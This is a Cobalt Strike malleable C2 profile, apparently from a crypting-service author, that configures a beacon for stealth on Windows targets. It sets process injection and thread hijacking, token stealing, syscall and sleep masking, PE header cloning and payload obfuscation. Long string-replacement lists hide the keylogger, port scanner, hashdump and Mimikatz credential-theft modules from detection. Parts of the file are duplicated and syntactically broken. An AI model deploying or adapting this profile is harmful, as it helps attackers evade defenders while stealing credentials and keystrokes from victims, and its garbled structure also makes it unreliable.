#
# CFS
# 
# Author: @EvilWhales
# https://t.me/cryptfileservice

###############################################################################
## Auxiliary Settings                                             
###############################################################################

set sample_name "cfs"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.

set host-stage "false";

set pipename "Winsock2\\CatalogChangeListener-####-0"; #######################

set pipename-stager "\\.\pipe\Winsock2\\CatalogChange####-####-0";

set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default

set create_remote_thread "true"; # Allow beacon to create threads in other processes

set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspended process

set tasks_max_remote_size "2097152"; # Set to 2MB (in bytes) to avoid OPSEC warning.

set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS (or use "11") to increase if needed. OPSEC warning.

set steal_frame_header "\x80";

###############################################################################
## Beacon Sleep Settings
###############################################################################

set sleeptime "30000"; # Choose a value that fits your needs. A great value is recommended.

set jitter "33"; # Default jitter factor (0-99%). A great value is recommended.

###############################################################################
## SSH Banner
###############################################################################

set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";

set ssh_pipename "LOCAL\\ubun-####-pipe-####-##";

###############################################################################
## Beacon Config
###############################################################################

set {
    allocator "MapViewOfFile";
    set stage {
        set rdl_load "PrependLoader"; #PrependLoader enable the use of eaf_bypass and rdll_use_syscalls
        set cleanup "true";
        set rdll_loader "true";
        set rdll_use_syscalls "true";
        set eaf_bypass "true";
        set cleanup "true";
        set cleanup_store_size "true";
        set sleep_mask "indirect";
        set syscall_mask "indirect";
        #set copy_peinject "true"; # Optional
        #set smartint_header "true"; # bypass EMET to avoid the OPSEC warning. Increase its post-exploitation tools, when they're known (Disabled when PrependLoader is used)
        beacon {
            Allgate {
            }
        }
    };
}

# For more details about the values, please refer to the official documentation: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend-pe-memory-indicators.htm

# set magic_mz_x86 "RZME";

set magic_mz_x64 "QY";

set magic_pe "##"; # Set to random values to avoid signature detections (limited to 2 characters)

set use_x86 "false";

# For more details about the values, please refer to the official documentation: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend-pe-memory-indicators.htm

set magic_mz_x86 "RZME";
set magic_mz_x64 "QY";

set magic_pe "##"; # Set to random values to avoid signature detections (limited to 2 characters)

set userwx "false";
set sleepmpe "true"; # Otherwise easy detection
set stomppe "true";
set obfuscate "true";

### Module Stomping configuration ###

#set module_x86 "wwanmmm.dll";
#set module_x64 "wwanmmm.dll"; # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
#set stomppe "true"; # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload

### PE Header Clone Config - making the reflective DLL look like a specific DLL in memory ###

set name "ActivationManager.dll";
set checksum "7145538";
set compile_time "18 Apr 2048 10:28:24";
set entry_point "128240";
set image_size_x64 "716800";
set image_size_x86 "716800";
set rich_header "\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";

### Beacon export obfusaction routing ###

### Change to your liking, as long as RC4 "128" is present. ###

transform-obfuscate {
    lznt1; # LZNT1 compression
    rc4 "128"; # RC4 encryption - Key length parameter: 8-2048
}

set entry_point_x64 "128240";
set image_size_x64 "716800";
set image_size_x86 "716800";

set rich_header
"\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";

### Beacon export obfusaction routing ###

### Change to your liking, as long as RC4 "128" is present. ###

transform-obfuscate {
    lznt1;          # LZNT1 compression
    rc4 "128";      # RC4 encryption - Key length parameter: 8-2048
    xor "64";       # xor encryption - Key length parameter: 8-2048
    #base64;        # encodes using base64 encoding
}

### String removal config ###

# The following configuration will remove the presence of the strings from the exported beacon

transform-x86 {
    strrep "%c%c%c%c%c%c%c%c%c%cMSSE-%d-server" "";
    strrep "Argument domain error (DOMAIN)" "";
    strrep "Argument singularity error (SIGN)" "";
    strrep "Argument singularity error (SIGN)" "";
    strrep "Overflow range error (OVERFLOW)" "";
    strrep "Partial loss of significance (PLOSS)" "";
    strrep "Total loss of significance (TLOSS)" "";
    strrep "The result is too small to be represented (UNDERFLOW)" "";
    strrep "Unknown error" "";
    strrep "_matherr(): %s in %s(%g, %g) " "";
    strrep "(retval=%g)" "";
    strrep "MingW-w64 runtime failure:" "";
    strrep "VirtualAddress %pQuery has failed for %d-section bytes at address %p" "";
    strrep "VirtualProtect failed with code 0x%x" "";
}

strrep "(retval=%g)" "";
strrep "Mingw-w64 runtime failure:" "";
strrep "Address %p has no image-section" "";
strrep "VirtualQuery has failed for %d bytes at address %p" "";
strrep "VirtualProtect failed with code 0x%x" "";
strrep "Unknown pseudo relocation protocol version %d." "";
strrep "Unknown pseudo relocation bit size %d." "";
}

transform-x64 {
    strrep "Argument domain error (DOMAIN)" "";
    strrep "Argument singularity error (SIGN)" "";
    strrep "Overflow range error (OVERFLOW)" "";
    strrep "Partial loss of significance (PLOSS)" "";
    strrep "Total loss of significance (TLOSS)" "";
    strrep "The result is too small to be represented (UNDERFLOW)" "";
    strrep "Unknown error" "";
    strrep "_matherr(): %s in %s(%g, %g)" "";
    strrep "(retval=%g)" "";
    strrep "MingW-w64 runtime failure:" "";
    strrep "Address %p has no image-section" "";
    strrep "VirtualQuery failed for %d bytes at address %p" "";
    strrep "VirtualProtect failed with code 0x%x" "";
    strrep "Unknown pseudo relocation protocol version %d." "";
    strrep "Unknown pseudo relocation bit size %d." "";
}

}

###############################################################################
## Post Exploitation Settings
###############################################################################

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiiprvse.exe -Embedding";

strrep "Unknown pseudo relocation bit size %d." "";
}

###############################################################################
## Post Exploitation Settings
###############################################################################

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiiprvse.exe -Embedding";
    set pipename "Winsock2\\CatalogChangeListener-####-0";

    set obfuscate "true";
    set smartinject "true";
    set cleanup "true";
    set amsi_disable "false"; # Recommended to Patch AMSI yourself
    set keylogger "GetAsyncKeyState";

    # Enable one of the following options for starting a spoofed thread
    #set threadhint "ntdll.dll!RtlUserThreadStart+0x21";
    #set threadhint "ntdll.dll!RtlUserThreadStart+0x9";
    #set threadhint "kernel32.dll!BaseThreadInitThunk+0x14";
}

transform-x64 {
    # replace the strings in the port scanner dll
    strrepex "PortScanner" "Scanner module is complete" "";
    strrepex "PortScanner" "(ICMP) Target" "pmci trg=";
    strrepex "PortScanner" "is alive." "is up.";
    strrepex "PortScanner" "(ARP) Target" "rpa trg=";
    strrepex "PortScanner" "[read %d bytes]" "";
    strrepex "PortScanner" "[-] Error: Failed to initialise WinSock. Winsock error code " "";
    strrepex "PortScanner" ". Extended error code" "";
    strrepex "PortScanner" "platform:" "pltfm=";
    strrepex "PortScanner" "version:" "vrs=";
    strrepex "PortScanner" "name:" "name=";
    strrepex "PortScanner" "domain:" "dmn=";

    strrepex "Hashdump" "[-] no results." "";

   strrepex "Keylogger" "________" "";
   strrepex "Keylogger" "[backspace]" "<bckspce>";
   strrepex "Keylogger" "[tab]" "<tab>";
   strrepex "Keylogger" "[clear]" "<clr>";
   strrepex "Keylogger" "[shift]" "<shft>";
   strrepex "Keylogger" "[control]" "<ctrl>";
   strrepex "Keylogger" "[alt]" "<alt>";
   strrepex "Keylogger" "[pause]" "<pause>";
   strrepex "Keylogger" "[caps lock]" "<cpslck>";
   strrepex "Keylogger" "[escape]" "<esc>";
   strrepex "Keylogger" "[page up]" "<pgup>";
   strrepex "Keylogger" "[page down]" "<pgdwn>";
   strrepex "Keylogger" "[end]" "<end>";
   strrepex "Keylogger" "[home]" "<home>";
   strrepex "Keylogger" "[left]" "<left>";
   strrepex "Keylogger" "[up]" "<up>";
   strrepex "Keylogger" "[right]" "<right>";
   strrepex "Keylogger" "[down]" "<dwn>";
   strrepex "Keylogger" "[prtscr]" "<prtsc>";
   strrepex "Keylogger" "[insert]" "<insrt>";
   strrepex "Keylogger" "[delete]" "<dlt>";
   strrepex "Keylogger" "[help]" "<help>";
   strrepex "Keylogger" "[command]" "<cmd>";
   strrepex "Keylogger" "[menu]" "<menu>";
   strrepex "Keylogger" "[F1]" "f1";
   strrepex "Keylogger" "[F2]" "f2";
   strrepex "Keylogger" "[F3]" "f3";
   strrepex "Keylogger" "[F4]" "f4";
   strrepex "Keylogger" "[F5]" "f5";
   strrepex "Keylogger" "[F6]" "f6";
   strrepex "Keylogger" "[F7]" "f7";
   strrepex "Keylogger" "[F8]" "f8";
   strrepex "Keylogger" "[F9]" "f9";
   strrepex "Keylogger" "[F10]" "f10";
   strrepex "Keylogger" "[F11]" "f11";
   strrepex "Keylogger" "[F12]" "f12";
   strrepex "Keylogger" "[F13]" "f13";
   strrepex "Keylogger" "[F14]" "f14";
   strrepex "Keylogger" "[F15]" "f15";
   strrepex "Keylogger" "[F16]" "f16";
   strrepex "Keylogger" "[F17]" "f17";
   strrepex "Keylogger" "[F18]" "f18";
   strrepex "Keylogger" "[F19]" "f19";
   strrepex "Keylogger" "[F20]" "f20";
   strrepex "Keylogger" "[F21]" "f21";
   strrepex "Keylogger" "[F22]" "f22";
   strrepex "Keylogger" "[F23]" "f23";
   strrepex "Keylogger" "[F24]" "f24";
   strrepex "Keylogger" "[numlock]" "<numlck>";
   strrepex "Keylogger" "[scroll lock]" "<scrlck>";
   strrepex "Keylogger" "[ctrl]" "<ctrl>";

   strrepex "NetView" "[-] Error:" "";
   strrepex "NetView" "IP Address:" "ipaddr";
   strrepex "NetView" "Server Name:" "srv";
   strrepex "NetView" "Server Name" "srv";
   strrepex "NetView" "------------------" "";
   strrepex "NetView" "------------------" "";
   strrepex "NetView" "------------------" "";
   strrepex "NetView" "------------------" "";
   strrepex "NetView" "------------------" "";
   strrepex "NetView" "-----" "";
   strrepex "NetView" "Domain Controllers" "DC";
   strrepex "NetView" "Domain Computers" "PC";
   strrepex "NetView" "Comment" "Desc";
   strrepex "NetView" "Name" "name";
   strrepex "NetView" "computers" "pc";
   strrepex "NetView" "localhost" "local";
   strrepex "NetView" "Computers:" "PC:";
   strrepex "NetView" "Computers in domain" "PC domain";
   strrepex "NetView" "dclist" "dc";
   strrepex "NetView" "DCs" "dcs";
   strrepex "NetView" "DCs in domain" "dcs domain";
   strrepex "NetView" "Domain Controllers:" "dc:";
   strrepex "NetView" "Domain Controllers in domain" "dc domain";
   strrepex "NetView" "List of domain trusts:" "";
   strrepex "NetView" "group" "grp";
   strrepex "NetView" "Members of" "mbmrs of";
   strrepex "NetView" "Groups:" "grps:";
   strrepex "NetView" "Groups for" "grps for";
   strrepex "NetView" "localgroup" "lclgrp";
   strrepex "NetView" "Groups for" "lcl grps for";
   strrepex "NetView" "Local groups for" "lcl grps for";
   strrepex "NetView" "logons" "lgns";
   strrepex "NetView" "Logged on users at" "lggon usrs at";
   strrepex "NetView" "sessions" "sess";
   strrepex "NetView" "Sessions for" "sess for";
   strrepex "NetView" "share" "shre";
   strrepex "NetView" "Shares at" "shres at";
   strrepex "NetView" "Users for" "usrs for";
   strrepex "NetView" "user" "usr";
   strrepex "NetView" "Account information for" "acc info for";
   strrepex "NetView" "List of hosts:" "hostlist:";
   strrepex "NetView" "List of hosts for domain" "hostlist domain";
   strrepex "NetView" "Idle (s)" "sleeping";
   strrepex "NetView" "Active (s)" "alive";
   strrepex "NetView" "User name" "usrname";
   strrepex "NetView" "Computer" "pc";
   strrepex "NetView" "Share name" "";
   strrepex "NetView" "Current time at" "";
   strrepex "NetView" "(Forest tree root)" "";
   strrepex "NetView" "(Forest)" "";
   strrepex "NetView" "(Primary Domain)" "";
   strrepex "NetView" "(Direct Outbound)" "";
   strrepex "NetView" "(Direct Inbound)" "";
   strrepex "NetView" "(Native)" "";
   strrepex "NetView" "Full Name" "";
   strrepex "NetView" "User Comment" "";
   strrepex "NetView" "Country code" "";
   strrepex "NetView" "Account active" "";
   strrepex "NetView" "Yes" "";
   strrepex "NetView" "Never" "";
   strrepex "NetView" "Account expires" "";
   strrepex "NetView" "Admin" "";
   strrepex "NetView" "Account type" "";
   strrepex "NetView" "Guest" "";
   strrepex "NetView" "User" "";
   strrepex "NetView" "Password last set" "";
   strrepex "NetView" "hours ago" "";
   strrepex "NetView" "Password expires" "";
   strrepex "NetView" "Password changeable" "";
   strrepex "NetView" "Password required" "";
   strrepex "NetView" "User may change password" "";
   strrepex "NetView" "Workstations allowed" "";
   strrepex "NetView" "Logon script" "";
   strrepex "NetView" "User profile" "";
   strrepex "NetView" "Home directory" "";
   strrepex "NetView" "Last logon" "";
   strrepex "NetView" "(admin)" "";
   strrepex "NetView" "unknown" "";
   strrepex "NetView" "Type" "";
   strrepex "NetView" "Version" "";
   strrepex "NetView" "Platform" "";
   strrepex "NetView" "PDC" "";
   strrepex "NetView" "BDC" "";

   strrepex "Mimikatz" "OK !" "";
   strrepex "Mimikatz" "OK data copy" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_enum_kerberos_callback_pth ; kull_m_memory_copy (0x" "";
   strrepex "Mimikatz" "\\_-" "";
   strrepex "Mimikatz" "Ticket Granting Ticket" "tigranti";
   strrepex "Mimikatz" "Client Ticket" "";
   strrepex "Mimikatz" "Ticket Granting Service" "tigranse";
   strrepex "Mimikatz" "Cachedirh:" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_sk_tryDecode ; SkpEncryptionWorker(decrypt):" "";
   strrepex "Mimikatz" "-- invalidating the key" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_sk_candidatekey_add ; No key?" "";
   strrepex "Mimikatz" "Encrypted:" "enc:";
   strrepex "Mimikatz" "unkData2 :" "";
   strrepex "Mimikatz" "* unkData1 :" "";
   strrepex "Mimikatz" "AuthData :" "";
   strrepex "Mimikatz" "Tag :" "";
   strrepex "Mimikatz" "KdfContext:" "";
   strrepex "Mimikatz" "* LSA Isolated Data:" "";
   strrepex "Mimikatz" "* unkData1 :" "";
   strrepex "Mimikatz" "AuthData :" "";
   strrepex "Mimikatz" "Tag :" "";
   strrepex "Mimikatz" "KdfContext:" "";
   strrepex "Mimikatz" "* LSA Isolated Data:" "";
   strrepex "Mimikatz" "* RootKey :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_trymarshal ; CredUnmarshalCredential (0x" "";
   strrepex "Mimikatz" "[?] ??" "";
   strrepex "Mimikatz" "[UsernameForPacked] ?" "";
   strrepex "Mimikatz" "[BinaryBlob]" "";
   strrepex "Mimikatz" "[UsernameTarget]" "";
   strrepex "Mimikatz" "Credential->cbSize is" "";
   strrepex "Mimikatz" "[Cert] SHA1:" "1ahs";
   strrepex "Mimikatz" "* Marshaled:" "";
   strrepex "Mimikatz" "LUID KO" "";
   strrepex "Mimikatz" "* Password:" "pwd";
   strrepex "Mimikatz" "* Domain :" "";
   strrepex "Mimikatz" "* Username :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_genericCredsOutput ; Unknown version in Kerberos credentials structure" "";
   strrepex "Mimikatz" "<no> kuhl_m_sekurlsa_buffer is incorrect" "";
   strrepex "Mimikatz" "* Key :" "key:";
   strrepex "Mimikatz" "Provider :" "";
   strrepex "Mimikatz" "Container:" "";
   strrepex "Mimikatz" "Reader :" "";
   strrepex "Mimikatz" "Card :" "";
   strrepex "Mimikatz" "PIN code :" "";
   strrepex "Mimikatz" "* Smartcard" "";
   strrepex "Mimikatz" "SHA1:" "sha1:";
   strrepex "Mimikatz" "DPAPI Key:" "";
   strrepex "Mimikatz" "PRT :" "";
   strrepex "Mimikatz" "* Raw data :" "";
   strrepex "Mimikatz" "* DPAPI :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_genericCredsOutput ; Size error for NtlmHash LsaIso output" "";
   strrepex "Mimikatz" "ERROR SHA1 kuhl_m_sekurlsa_genericCredsOutput ; Size error for NtlmHash LsaIso output" "";
   strrepex "Mimikatz" "* LM1 :" "";
   strrepex "Mimikatz" "* LM :" "";
   strrepex "Mimikatz" "* NTLM :" "mtltn:";
   strrepex "Mimikatz" "* NTLM :" "mtln:";
   strrepex "Mimikatz" "* LM Domain :" "";
   strrepex "Mimikatz" "* Domain :" "";
   strrepex "Mimikatz" "* Username :" "";

   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; memory handle is not KULL_M_MEMORY_TYPE_PROCESS" "";
   strrepex "Mimikatz" "\\_ kerberos -" "";
   strrepex "Mimikatz" "\\_ msv1_0 -" "";
   strrepex "Mimikatz" "| LUID" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; NtQueryObject:" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; OpenProcess" "";
   strrepex "Mimikatz" "is now R/W" "";
   strrepex "Mimikatz" "was already Process R/W" "";
   strrepex "Mimikatz" "| LSA Process" "";
   strrepex "Mimikatz" "Missing at least one argument : ntlm/rc4 OR aes128 OR aes256" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Bad user or LUID" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; CreateProcessWithLogonW" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; OpenProcessToken" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; GetTokenInformationEx" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; DuplicateTokenEx" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; SetThreadToken" "";
   strrepex "Mimikatz" "** Token Impersonation **" "";
   strrepex "Mimikatz" "| TID %u" "";
   strrepex "Mimikatz" "| : PID %u NTLM/RC4 key in a session" "";
   strrepex "Mimikatz" "ERROR replacing kuhl_m_sekurlsa_pth ; ntlm hash/rc4 key length must be 32 (16 bytes)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; GetTokenInformationEx" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; DuplicateTokenEx" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; SetThreadToken" "";
   strrepex "Mimikatz" "** Token Impersonation **" "";
   strrepex "Mimikatz" "| TID %u" "";
   strrepex "Mimikatz" "| PID %u" "";
   strrepex "Mimikatz" "replacing NTLM/RC4 key in a session" "";
   strrepex "Mimikatz" "ERROR replacing kuhl_m_sekurlsa_pth ; ntlm hash/rc4 key length must be 32 (16 bytes)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key length must be 64 (32 bytes)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES128 key length must be 32 (16 bytes)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing argument : user" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing argument : domain" "";
   strrepex "Mimikatz" "impersonate" "";
   strrepex "Mimikatz" "luid" "";
   strrepex "Mimikatz" "SID :" "";
   strrepex "Mimikatz" "Logon Time :" "";
   strrepex "Mimikatz" "Logon Server :" "";
   strrepex "Mimikatz" "Domain :" "";
   strrepex "Mimikatz" "User Name :" "";
   strrepex "Mimikatz" "Session Id :" "";
   strrepex "Mimikatz" "Authentication Id :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory" "";
   strrepex "Mimikatz" "Unknown !" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Local LSA library failed" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Modules informations" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Key import" "";
   strrepex "Mimikatz" "candidate Secure keys found" "";
   strrepex "Mimikatz" "> bytes) Kernel stream found in minidump (" "";
   strrepex "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; LSASS process not found (?)" "";
   strrepex "Mimikatz" "file for minidump ... " "";
   strrepex "Mimikatz" "Opening :" "";
   strrepex "Mimikatz" "SekurLSA module" "";
   strrepex "Mimikatz" "List Credentials Manager" "";
   strrepex "Mimikatz" "List Cached MasterKeys" "";
   strrepex "Mimikatz" "List Kerberos Encryption Keys" "";
   strrepex "Mimikatz" "List Kerberos tickets" "";
   strrepex "Mimikatz" "Preferred Backup Master keys" "";
   strrepex "Mimikatz" "Antisocial" "";
   strrepex "Mimikatz" "DPAPI_SYSTEM secret" "";
   strrepex "Mimikatz" "dpapisystem" "";
   strrepex "Mimikatz" "krbtgt!" "";
   strrepex "Mimikatz" "Pass-the-hash" "";
   strrepex "Mimikatz" "Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials" "";
   strrepex "Mimikatz" "Switch (or reinit) to LSASS minidump context" "";
   strrepex "Mimikatz" "Lists CloudApAp credentials" "";
   strrepex "Mimikatz" "Switch (or reinit) to LSASS process context" "";
   strrepex "Mimikatz" "Lists (or available) to providers process credentials" "";
   strrepex "Mimikatz" "List SSP credentials" "";
   strrepex "Mimikatz" "Lists LiveSSP credentials" "";
   strrepex "Mimikatz" "Lists TsPkg credentials" "";
   strrepex "Mimikatz" "Lists Kerberos credentials" "";
   strrepex "Mimikatz" "Lists WDigest credentials" "";
   strrepex "Mimikatz" "Lists LM & NTLM credentials" "";
   strrepex "Mimikatz" "Some LM & NTLM to enumerate credentials ... " "";
   strrepex "Mimikatz" "Try to decrypt" "";
   strrepex "Mimikatz" "Try to sign" "";
   strrepex "Mimikatz" "Try to decrypt a PIN Protector" "";
   strrepex "Mimikatz" "Verify Name for:" "";
   strrepex "Mimikatz" "SessionNameKey:" "";
   strrepex "Mimikatz" "pNC->Name:" "";
   strrepex "Mimikatz" "pNC->Sid :" "";
   strrepex "Mimikatz" "pNC->Guid :" "";
   strrepex "Mimikatz" "(not an object GUID)" "";
   strrepex "Mimikatz" "Link to key with GUID:" "";
   strrepex "Mimikatz" "** TRUSTED DOMAIN - Antisocial **" "";
   strrepex "Mimikatz" "BKUPKEY_PREFERRED - BACKUPKEY_P Secret" "";
   strrepex "Mimikatz" "BKUPKEY_P Secret" "";
   strrepex "Mimikatz" "BKUPKEY_" "";
   strrepex "Mimikatz" "Unknown data :" "";
   strrepex "Mimikatz" "Last change:" "";
   strrepex "Mimikatz" "Password :" "pwd:";
   strrepex "Mimikatz" "Partner :" "";
   strrepex "Mimikatz" "LAPS:" "";
   strrepex "Mimikatz" "Credentials:" "";
   strrepex "Mimikatz" "Object Relative ID :" "";
   strrepex "Mimikatz" "Object Security ID :" "";
   strrepex "Mimikatz" "SID :" "";
   strrepex "Mimikatz" "Password history last change :" "";
   strrepex "Mimikatz" "Account expiration :" "";
   strrepex "Mimikatz" "User Account Control :" "";
   strrepex "Mimikatz" "Account Type :" "";
   strrepex "Mimikatz" "User Principal Name :" "";
   strrepex "Mimikatz" "SAM Username :" "";
   strrepex "Mimikatz" "** SAM ACCOUNT **" "";
   strrepex "Mimikatz" "Key Package :" "[";
   strrepex "Mimikatz" "Key Package Size :" "";
   strrepex "Mimikatz" "byte(s)" "";
   strrepex "Mimikatz" "Recovery Password (fake) :" "";
   strrepex "Mimikatz" "Recovery GUID :" "";
   strrepex "Mimikatz" "Volume GUID :" "";
   strrepex "Mimikatz" "** BITLOCKER RECOVERY INFORMATION **" "";
   strrepex "Mimikatz" "Object RDN :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_describeObject_csv ; RtlDecryptNtOwFPwdWithIndex" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_decrypt ; RtlDecryptNtOwFPwdWithIndex/RtlDecryptLmOwFPwdWithIndex" "";
   strrepex "Mimikatz" "Hash :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; ldap_search_s 0x" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; More than one entry?" "";
   strrepex "Mimikatz" "[ldap]" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; No values?" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDN" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Domain Controller not present" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Missing user or guid argument" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; RPC Exception 0x" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; DRSGetNCChanges, invalid dwOutVersion (" "";
   strrepex "Mimikatz" ") and/or cNumObjects (" "";
   strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply" "";
   strrepex "Mimikatz" "[will be the userIntId ms-DS-ReplicationEpoch is:" "";
   strrepex "Mimikatz" "[DC] Object with GUID" "";
   strrepex "Mimikatz" "[DC] Exporting domain" "";
   strrepex "Mimikatz" "Revert to process token" "";
   strrepex "Mimikatz" "Impersonation" "";
   strrepex "Mimikatz" "Identification" "";
   strrepex "Mimikatz" "Anonymous" "";
   strrepex "Mimikatz" "Run!" "";
   strrepex "Mimikatz" "Impersonate a token" "";
   strrepex "Mimikatz" "List all tokens of the system" "";
   strrepex "Mimikatz" "Display current identity" "";
   strrepex "Mimikatz" "UasServer" "";
   strrepex "Mimikatz" "TrustedDomain" "";
   strrepex "Mimikatz" "[DC]" "";
   strrepex "Mimikatz" "TrustedDnsDomain" "";
   strrepex "Mimikatz" "Export" "";
   strrepex "Mimikatz" "* Unknown key : seen as" "";
   strrepex "Mimikatz" "* Legacy key" "";
   strrepex "Mimikatz" "out-1" "";
   strrepex "Mimikatz" "In-1" "";
   strrepex "Mimikatz" "unknown?" "";
   strrepex "Mimikatz" "Random Value :" "";
   strrepex "Mimikatz" "OlderCredentials" "";
   strrepex "Mimikatz" "Default Iterations :" "";
   strrepex "Mimikatz" "Default Salt :" "";
   strrepex "Mimikatz" "OldCredentials Salt" "";
   strrepex "Mimikatz" "Default MSCache v2 (from registry or hives)" "";
   strrepex "Mimikatz" "NTLM-Strong-NTOWF" "";
   strrepex "Mimikatz" "Kerberos-Newer-Keys" "";
   strrepex "Mimikatz" "Supplemental Credentials:" "";
   strrepex "Mimikatz" "LsaDump module" "";
   strrepex "Mimikatz" "Skew1" "";
   strrepex "Mimikatz" "Ask a DC to send current and previous NTLM hash of DC/SRV/WKS" "";
   strrepex "Mimikatz" "Ask a DC server to set a new password/ntlm for one user/SRV/WKS" "";
   strrepex "Mimikatz" "Ask a DC to synchronize an object" "";
   strrepex "Mimikatz" "Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)" "";
   strrepex "Mimikatz" "Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)" "";
   strrepex "Mimikatz" "Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)" "";
   strrepex "Mimikatz" "Get the SysKey to decrypt SECRETS entries (from registry or hives)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; kull_m_file_writeData (" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; No suitable file exportData type for key group:" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; NCryptExportKey" "";
   strrepex "Mimikatz" "-- init):" "";
